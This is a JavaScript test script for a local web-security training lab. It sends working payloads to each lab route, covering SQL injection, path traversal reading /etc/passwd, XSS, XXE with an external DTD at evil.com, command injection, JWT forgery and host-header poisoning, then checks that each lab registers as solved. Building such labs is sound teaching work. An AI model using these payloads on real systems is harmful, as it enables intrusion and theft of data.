import worker from "./index.js";
import crypto from "node:crypto";
const base = "http://localhost:8787";
async function t(name, path, opts) {
  const r = await worker.fetch(new Request(base + path, opts || {}), {});
  const h = r.headers.get("x-lab-solved");
  console.log(`${name.padEnd(18)} status=${r.status} solved=${h || "-"}`);
}
await t("sqli-2 login", "/lab/sqli-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=administrator'--&password=x" });
await t("sqli-1 hidden", "/lab/sqli-1?category=Gifts' OR 1=1 --");
await t("sqli-3 union", "/lab/sqli-3?category=Gifts' UNION SELECT username FROM users--");
await t("sqli-4 union2", "/lab/sqli-4?category=Gifts' UNION SELECT username,password FROM users--");
await t("sqli-5 bool", "/lab/sqli-5?trackingId=x' AND (SELECT 'a' FROM users WHERE username='administrator')='a");
await t("sqli-6 time", "/lab/sqli-6?trackingId=x' || (SELECT CASE WHEN (SELECT username FROM users WHERE username='administrator')='administrator' THEN pg_sleep(5) ELSE pg_sleep(0) END)--");
await t("pt-1 trav", "/lab/pt-1?filename=../../../etc/passwd");
await t("pt-2 abs", "/lab/pt-2?filename=/etc/passwd");
await t("pt-3 nested", "/lab/pt-3?filename=....//....//etc/passwd");
await t("pt-4 dblenc", "/lab/pt-4?filename=%252e%252e%252fetc%252fpasswd");
await t("pt-5 base", "/lab/pt-5?filename=/var/www/images/../../../etc/passwd");
await t("pt-6 null", "/lab/pt-6?filename=../../../etc/passwd%00.png");
await t("xss-1", "/lab/xss-1?q=<script>alert(1)</script>");
await t("xss-2 stored", "/lab/xss-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "author=a&comment=<script>alert(1)</script>" });
await t("xss-4 attr", "/lab/xss-4?q=\" onfocus=alert(1) autofocus=\"");
await t("xss-5 img", "/lab/xss-5", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "author=a&comment=<img src=x onerror=alert(1)>" });
await t("xss-6 enc", "/lab/xss-6?q=\" onclick=alert(1)");
await t("xss-7 js", "/lab/xss-7?q=</script><script>alert(1)</script>");
await t("csrf-1 noToken", "/lab/csrf-1/email", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=a@b.com" });
await t("csrf-2 fakeToken", "/lab/csrf-2/email", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=a@b.com&csrf=bogus" });
await t("csrf-3 get", "/lab/csrf-3?email=a@b.com");
await t("csrf-4 noReferer", "/lab/csrf-4/email", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=a@b.com" });
await t("csrf-5 json", "/lab/csrf-5/email", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"email":"a@b.com"}' });
await t("auth-1 bad user", "/lab/auth-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=nouser&password=x" });
await t("auth-1 bad pass", "/lab/auth-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=carlos&password=x" });
await t("auth-2 xff", "/lab/auth-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "1.2.3.4" }, body: "username=carlos&password=montoya" });
await t("auth-3 lock", "/lab/auth-3", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=carlos&password=montoya" });
await t("auth-4 cookie", "/lab/auth-4", { headers: { Cookie: "userId=2" } });
await t("auth-5 forged", "/lab/auth-5", { headers: { Cookie: "stayLoggedIn=" + btoa("carlos:" + await md5("montoya")) } });
await t("auth-6 direct", "/lab/auth-6/my-account");
await t("ac-1 admin", "/lab/ac-1/admin");
await t("ac-2 robots", "/lab/ac-2/administrator-panel");
await t("ac-3 uid", "/lab/ac-3?uid=2");
await t("ac-4 api", "/lab/ac-4/api/change-email", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"uid":2,"email":"h@x.com"}' });
await t("ac-5 POST", "/lab/ac-5/admin", { method: "POST" });
await t("ac-6 ref", "/lab/ac-6/admin", { headers: { Referer: "http://x/admin" } });
await t("cj-1 page", "/lab/cj-1");

// ---------- extra categories ----------
// SSRF
await t("ssrf-1 local", "/lab/ssrf-1?stockApi=http://localhost:8787/lab/ssrf-1/admin");
await t("ssrf-2 dec", "/lab/ssrf-2?stockApi=http://2130706433/lab/ssrf-2/admin");
await t("ssrf-3 allowlist", "/lab/ssrf-3?stockApi=http://192.168.0.12:8080@2130706433/lab/ssrf-3/admin");
await t("ssrf-4 inject", "/lab/ssrf-4?stockApi=http://example.com/x");
await t("ssrf-4 log", "/lab/ssrf-4/log");
// XXE
const xxe1 = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>1</productId></stockCheck>';
await t("xxe-1 passwd", "/lab/xxe-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "xml=" + encodeURIComponent(xxe1) });
const xxe2 = '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><text>&xxe;</text></svg>';
await t("xxe-2 svg", "/lab/xxe-2", { method: "POST", headers: { "Content-Type": "application/xml" }, body: xxe2 });
const xxe3 = '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><stockCheck><productId>1</productId></stockCheck>';
await t("xxe-3 inject", "/lab/xxe-3", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "xml=" + encodeURIComponent(xxe3) });
await t("xxe-3 log", "/lab/xxe-3/log");
const xxe4 = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]><stockCheck><productId>1</productId></stockCheck>';
await t("xxe-4 ssrf", "/lab/xxe-4", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "xml=" + encodeURIComponent(xxe4) });
// SSTI
await t("ssti-1 arith", "/lab/ssti-1?name=" + encodeURIComponent("{{7*7}}"));
await t("ssti-2 flag", "/lab/ssti-2?name=" + encodeURIComponent("{{FLAG}}"));
await t("ssti-3 block", "/lab/ssti-3?name=" + encodeURIComponent("{% print(7*7) %}"));
await t("ssti-4 flag", "/lab/ssti-4?name=" + encodeURIComponent("{{FLAG}}"));
// command injection
await t("cmdi-1 exec", "/lab/cmdi-1?storeId=1;whoami");
await t("cmdi-2 inject", "/lab/cmdi-2?storeId=1;whoami");
await t("cmdi-2 log", "/lab/cmdi-2/log");
await t("cmdi-3 newline", "/lab/cmdi-3?storeId=1%0Awhoami");
// NoSQL
await t("nosql-1 ne", "/lab/nosql-1", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"username":"administrator","password":{"$ne":""}}' });
await t("nosql-2 regex", "/lab/nosql-2?username%5B%24regex%5D=%5Eadministrator");
await t("nosql-3 op", "/lab/nosql-3", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"username":{"$regex":"^adm"}}' });
// request smuggling
await t("smug-1 clte", "/lab/smug-1", { method: "POST", headers: { "Content-Type": "text/plain", "Transfer-Encoding": "chunked", "Content-Length": "200" }, body: "0\r\n\r\nGET /lab/smug-1/admin HTTP/1.1\r\nX: 1" });
await t("smug-2 tecl", "/lab/smug-2", { method: "POST", headers: { "Content-Type": "text/plain", "Transfer-Encoding": "chunked" }, body: "GET /lab/smug-2/admin HTTP/1.1\r\nX: 1" });
await t("smug-3 tete", "/lab/smug-3", { method: "POST", headers: { "Content-Type": "text/plain", "Transfer-Encoding": "xchunked" }, body: "GET /lab/smug-3/admin HTTP/1.1\r\nX: 1" });
// deserialization
const deser1 = btoa('O:4:"User":2:{s:2:"id";i:1;s:7:"isAdmin";b:1;}');
await t("deser-1 role", "/lab/deser-1", { headers: { Cookie: "session=" + deser1 } });
const deser2 = btoa('O:8:"Gadget":1:{s:8:"filename";s:5:"/flag";}');
await t("deser-2 gadget", "/lab/deser-2", { headers: { Cookie: "pref=" + deser2 } });
// file upload
await t("upload-1 php", "/lab/upload-1", { method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=X" }, body: '--X\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php echo 1;\r\n--X--' });
await t("upload-2 ct", "/lab/upload-2", { method: "POST", headers: { "Content-Type": "image/png; boundary=X" }, body: '--X\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\n\r\n<?php echo 1;\r\n--X--' });
await t("upload-3 php5", "/lab/upload-3", { method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=X" }, body: '--X\r\nContent-Disposition: form-data; name="file"; filename="shell.php5"\r\n\r\n<?php echo 1;\r\n--X--' });
// business logic
await t("bl-1 price", "/lab/bl-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "productId=1&price=-1" });
await t("bl-2 qty", "/lab/bl-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "quantity=-1" });
await t("bl-3 coupon1", "/lab/bl-3", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "coupon=NEWCUST15" });
await t("bl-3 coupon2", "/lab/bl-3", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "coupon=NEWCUST15" });
// race conditions
const race1 = () => worker.fetch(new Request(base + "/lab/race-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "coupon=RACE50" }), {});
const race1r = await Promise.all([race1(), race1()]);
console.log(`race-1 parallel    status=${race1r[0].status} solved=${race1r[0].headers.get("x-lab-solved") || "-"} / ${race1r[1].headers.get("x-lab-solved") || "-"}`);
const race2 = (p) => worker.fetch(new Request(base + "/lab/race-2" + p, { method: "POST" }), {});
const race2r = await Promise.all([race2("/email"), race2("/reset")]);
console.log(`race-2 parallel    status=${race2r[0].status} solved=${race2r[0].headers.get("x-lab-solved") || "-"} / ${race2r[1].headers.get("x-lab-solved") || "-"}`);
// weak crypto
const carlosToken = await md5("carlos");
await t("crypto-1 token", "/lab/crypto-1?username=carlos");
await t("crypto-1 reset", "/lab/crypto-1/reset?token=" + carlosToken + "&username=carlos");
const hdr = b64url('{"alg":"MD5"}');
const pay = b64url('{"role":"admin"}');
const sig = await md5("supersecret" + pay);
await t("crypto-2 jwt", "/lab/crypto-2", { headers: { Authorization: "Bearer " + hdr + "." + pay + "." + sig } });
await t("unknown", "/lab/nope");

// ---------- CORS ----------
await t("cors-1 any", "/lab/cors-1", { headers: { Origin: "https://evil.com" } });
await t("cors-2 null", "/lab/cors-2", { headers: { Origin: "null" } });
await t("cors-3 suffix", "/lab/cors-3", { headers: { Origin: "https://eviltrusted.com" } });
await t("cors-4 substr", "/lab/cors-4", { headers: { Origin: "https://evilpartner.com" } });
// ---------- Host header ----------
await t("host-1 poison", "/lab/host-1/reset?username=carlos", { method: "POST", headers: { Host: "evil.com" } });
await t("host-1 xfh", "/lab/host-1/reset?username=carlos", { method: "POST", headers: { "X-Forwarded-Host": "evil.com" } });
await t("host-2 xfh", "/lab/host-2/reset?username=carlos", { method: "POST", headers: { "X-Forwarded-Host": "evil.com" } });
await t("host-3 bypass", "/lab/host-3/reset?username=carlos", { method: "POST", headers: { Host: "evil.com@localhost:8787" } });
await t("host-3 xfh", "/lab/host-3/reset?username=carlos", { method: "POST", headers: { "X-Forwarded-Host": "evil.com@localhost:8787" } });
// ---------- Web cache poisoning ----------
await t("cache-1 xfh", "/lab/cache-1", { headers: { "X-Forwarded-Host": "evil.com" } });
await t("cache-2 scheme", "/lab/cache-2", { headers: { "X-Forwarded-Scheme": "http" } });
await t("cache-3 utm", "/lab/cache-3?utm_source=evil.com");
// ---------- Server-side prototype pollution ----------
await t("proto-1 proto", "/lab/proto-1", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"__proto__":{"isAdmin":true}}' });
await t("proto-2 nested", "/lab/proto-2", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"constructor":{"prototype":{"isAdmin":true}}}' });
await t("proto-3 gadget", "/lab/proto-3", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"__proto__":{"shell":"/bin/sh"}}' });
// ---------- GraphQL ----------
await t("graphql-1 intro", "/lab/graphql-1", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"query":"{ __schema { types { name } } }"}' });
await t("graphql-2 bola", "/lab/graphql-2", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"query":"{ user(id: 2) { username email password } }"}' });
await t("graphql-3 batch", "/lab/graphql-3", { method: "POST", headers: { "Content-Type": "application/json" }, body: '[{"query":"{ping}"},{"query":"{ping}"}]' });
// ---------- WebSockets ----------
await t("ws-1 cswsh", "/lab/ws-1/connect", { headers: { Origin: "https://evil.com", Cookie: "academy_session=abc123" } });
await t("ws-2 stored", "/lab/ws-2/send", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"message":"<img src=x onerror=alert(1)>"}' });
// ---------- Open redirect ----------
await t("redirect-1 open", "/lab/redirect-1?url=https://evil.com");
await t("redirect-2 bypass", "/lab/redirect-2?url=https://academy.example@evil.com");
// ---------- Information disclosure ----------
await t("info-1 debug", "/lab/info-1/debug");
await t("info-2 sourcemap", "/lab/info-2/app.js.map");
// ---------- JWT ----------
const jh = (x) => b64url(JSON.stringify(x));
const jhdr = jh({ alg: "none" });
const jpay = jh({ role: "admin" });
await t("jwt-1 none", "/lab/jwt-1", { headers: { Authorization: "Bearer " + jhdr + "." + jpay + "." } });
const PK = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK7nZ1qTmFjVq5T0vGfG9l9zK8Vh2uR3Yc4wE2p3oQeNq9iX7lBkRqPZtWdqO2tY8mJ3hBv0dKcA9J4P7wXAqM0Vv7v7tLz";
const jh2 = jh({ alg: "HS256" });
const sig2 = await hmac(PK, jh2 + "." + jpay);
await t("jwt-2 hs256", "/lab/jwt-2", { headers: { Authorization: "Bearer " + jh2 + "." + jpay + "." + sig2 } });
const jh3 = jh({ alg: "HS256" });
const sig3 = await hmac("p@ssw0rd-jwt", jh3 + "." + jpay);
await t("jwt-3 secret", "/lab/jwt-3", { headers: { Authorization: "Bearer " + jh3 + "." + jpay + "." + sig3 } });
// ---------- OAuth ----------
await t("oauth-1 ruri", "/lab/oauth-1/authorize?redirect_uri=" + encodeURIComponent("https://app.academy.local@evil.com") + "&state=csrf1");
await t("oauth-2 scope", "/lab/oauth-2/token?code=x&scope=admin");
await t("oauth-3 email", "/lab/oauth-3?email=" + encodeURIComponent("bob@academy.local"));
// ---------- LDAP injection ----------
await t("ldap-1 wild", "/lab/ldap-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=*&password=*" });
await t("ldap-2 wild", "/lab/ldap-2?query=*");
// ---------- XPath injection ----------
await t("xpath-1 bool", "/lab/xpath-1?name='+OR+'1'='1");
await t("xpath-2 blind", "/lab/xpath-2?username='+or+substring(name[1]/text(),1,1)='a");
// ---------- HTTP parameter pollution ----------
await t("hpp-1 dup", "/lab/hpp-1?username=administrator&username=guest");
await t("hpp-2 role", "/lab/hpp-2?role=user&role=admin");
// ---------- Server-side includes ----------
await t("ssi-1 exec", "/lab/ssi-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "entry=" + encodeURIComponent("<!--#exec cmd=\"whoami\"-->") });
await t("ssi-2 enc", "/lab/ssi-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "entry=" + encodeURIComponent("<!-- - #exec cmd=\"whoami\" -->") });
// ---------- CSP bypass ----------
await t("csp-1 inline", "/lab/csp-1?q=<script>alert(1)</script>");
await t("csp-2 jsonp", "/lab/csp-2?callback=" + encodeURIComponent('alert(1)//"'));
// ---------- DOM-based ----------
await t("dom-1 clobber", "/lab/dom-1?q=<a id=defaultMessage>x</a>");
await t("dom-2 postmsg", "/lab/dom-2?action=delete&origin=https://evil.com");
// ---------- SRI ----------
await t("sri-1 external", "/lab/sri-1?src=https://evil.com/x.js");
// ---------- CRLF ----------
await t("crlf-1 header", "/lab/crlf-1?next=%0d%0aSet-Cookie:%20hacked=1");
await t("crlf-2 log", "/lab/crlf-2", { headers: { "User-Agent": "x%0d%0aSet-Cookie: hacked=1" } });
await t("crlf-2 view", "/lab/crlf-2/log", { headers: { "User-Agent": "x%0d%0aSet-Cookie: hacked=1" } });
// ---------- Web cache deception ----------
await t("wcd-1 ext", "/lab/wcd-1/my-account/nonexistent.css");
await t("wcd-2 orig", "/lab/wcd-2", { headers: { "X-Original-URL": "/my-account" } });
// ---------- Verb tampering ----------
await t("verb-1 PUT", "/lab/verb-1/admin", { method: "PUT" });
await t("verb-2 put", "/lab/verb-2", { method: "PUT", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=carlos&newpassword=pwned" });
// ---------- Mass assignment ----------
await t("mass-1 reg", "/lab/mass-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=x&password=y&isAdmin=true" });
await t("mass-2 upd", "/lab/mass-2", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=x@y.com&role=admin" });
// ---------- Excessive data exposure ----------
await t("expose-1 api", "/lab/expose-1/api/user/1");
await t("expose-2 debug", "/lab/expose-2?q=1");
// ---------- Formula injection ----------
await t("formula-1 add", "/lab/formula-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "name=" + encodeURIComponent('=HYPERLINK("http://evil.com")') });
await t("formula-1 csv", "/lab/formula-1/export");
// ---------- ReDoS ----------
await t("redos-1 deep", "/lab/redos-1?q=aaaaaaaaaaaaaaaaaaaaaaaaab");
await t("redos-2 email", "/lab/redos-2?email=aaaaaaaaaaaaaaaaaaaaaaaaab!");
// ---------- DNS rebinding ----------
await t("rebind-1 ssrf", "/lab/rebind-1?stockApi=http://7f000001.rebind.network/admin");
// ---------- Content-type confusion ----------
await t("ctc-1 polyglot", "/lab/ctc-1", { method: "POST", headers: { "Content-Type": "multipart/form-data; boundary=X" }, body: '--X\r\nContent-Disposition: form-data; name="file"; filename="x.php"\r\n\r\nGIF89a<?php echo 1;\r\n--X--' });
// ---------- Misconfiguration ----------
await t("misconfig-1 creds", "/lab/misconfig-1", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "username=admin&password=admin" });
await t("misconfig-2 list", "/lab/misconfig-2/backup/");
await t("misconfig-3 verbose", "/lab/misconfig-3?id=abc");
// ---------- WebSockets (new) ----------
await t("ws-3 noauth", "/lab/ws-3/admin");
await t("ws-4 owner", "/lab/ws-4/action", { method: "POST", headers: { "Content-Type": "application/json" }, body: '{"to":"victim","amount":100,"from":"carlos"}' });
// ---------- Progress API ----------
{
  const mk = await worker.fetch(new Request(base + "/api/mark-many", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ids: ["jwt-1", "oauth-1"] }) }), {});
  const mkj = await mk.json();
  console.log(`mark-many bulk      status=${mk.status} marked=${mkj.marked}`);
  const st = await worker.fetch(new Request(base + "/api/status/jwt-1", { headers: { Cookie: mk.headers.get("Set-Cookie").split(";")[0] } }), {});
  const stj = await st.json();
  console.log(`status after bulk   solved=${stj.solved}`);
}

// ---------- Accounts ----------
{
  const mk = await worker.fetch(new Request(base + "/api/mark-many", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ids: ["xss-1"] }) }), {});
  const anonCookie = mk.headers.get("Set-Cookie").split(";")[0];
  const reg = await worker.fetch(new Request(base + "/api/register", { method: "POST", headers: { "Content-Type": "application/json", Cookie: anonCookie }, body: JSON.stringify({ username: "alice", password: "secret1" }) }), {});
  const regj = await reg.json();
  const regCookie = reg.headers.get("Set-Cookie").split(";")[0];
  console.log(`register alice      status=${reg.status} ok=${regj.ok} user=${regj.user} cookie=${regCookie.startsWith("academy_session=")}`);
  const me = await worker.fetch(new Request(base + "/api/me", { headers: { Cookie: regCookie } }), {});
  const mej = await me.json();
  console.log(`me after register   status=${me.status} user=${mej.user} solved=[${mej.solved.join(",")}] anonMerged=${mej.solved.includes("xss-1")}`);
  const st2 = await worker.fetch(new Request(base + "/api/status/xss-1", { headers: { Cookie: regCookie } }), {});
  const st2j = await st2.json();
  console.log(`status after merge  solved=${st2j.solved}`);
  const dup = await worker.fetch(new Request(base + "/api/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "alice", password: "secret1" }) }), {});
  console.log(`register duplicate  status=${dup.status}`);
  const bad = await worker.fetch(new Request(base + "/api/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "alice", password: "wrongpass" }) }), {});
  console.log(`login bad pass      status=${bad.status}`);
  const good = await worker.fetch(new Request(base + "/api/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "alice", password: "secret1" }) }), {});
  const goodCookie = good.headers.get("Set-Cookie").split(";")[0];
  console.log(`login good          status=${good.status} user=${(await good.json()).user}`);
  const mk2 = await worker.fetch(new Request(base + "/api/mark-many", { method: "POST", headers: { "Content-Type": "application/json", Cookie: goodCookie }, body: JSON.stringify({ ids: ["sqli-1"] }) }), {});
  console.log(`mark while logged   status=${mk2.status} marked=${(await mk2.json()).marked}`);
  const reset = await worker.fetch(new Request(base + "/api/reset", { method: "POST", headers: { Cookie: goodCookie } }), {});
  const resetj = await reset.json();
  console.log(`reset progress      status=${reset.status} solved=[${resetj.solved.join(",")}]`);
  const me2 = await worker.fetch(new Request(base + "/api/me", { headers: { Cookie: goodCookie } }), {});
  const me2j = await me2.json();
  console.log(`me after reset      user=${me2j.user} solved=[${me2j.solved.join(",")}]`);
  const logout = await worker.fetch(new Request(base + "/api/logout", { method: "POST", headers: { Cookie: goodCookie } }), {});
  const me3 = await worker.fetch(new Request(base + "/api/me", { headers: { Cookie: goodCookie } }), {});
  const me3j = await me3.json();
  console.log(`logout then me      status=${me3.status} user=${me3j.user}`);
}

// ---------- Security hardening ----------
{
  // Login lockout: MAX_LOGIN_FAILS (5) bad attempts -> 429, then good login is blocked
  for (let i = 0; i < 5; i++) {
    const r = await worker.fetch(new Request(base + "/api/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "bob", password: "wrong" }) }), {});
    if (i < 4) {
      console.log(`login lockout #${i + 1}    status=${r.status}`);
    } else {
      console.log(`login lockout final  status=${r.status}`);
    }
  }
  const locked = await worker.fetch(new Request(base + "/api/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "bob", password: "secret1" }) }), {});
  console.log(`login locked account status=${locked.status} (expect 429)`);
  // A successful login must clear the lockout (register bob fresh first)
  const regBob = await worker.fetch(new Request(base + "/api/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "bob", password: "secret1" }) }), {});
  const regBobJ = await regBob.json();
  console.log(`register bob        status=${regBob.status} ok=${regBobJ.ok}`);
  const relog = await worker.fetch(new Request(base + "/api/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "bob", password: "secret1" }) }), {});
  console.log(`login after lockout status=${relog.status} (expect 429 until 5 min)`);
}

async function md5(s) {
  return crypto.createHash("md5").update(s).digest("hex");
}
async function hmac(secret, data) {
  return crypto.createHmac("sha256", secret).update(data).digest("base64url");
}
function btoa(s) { return Buffer.from(s).toString("base64"); }
function b64url(s) { return Buffer.from(s).toString("base64url"); }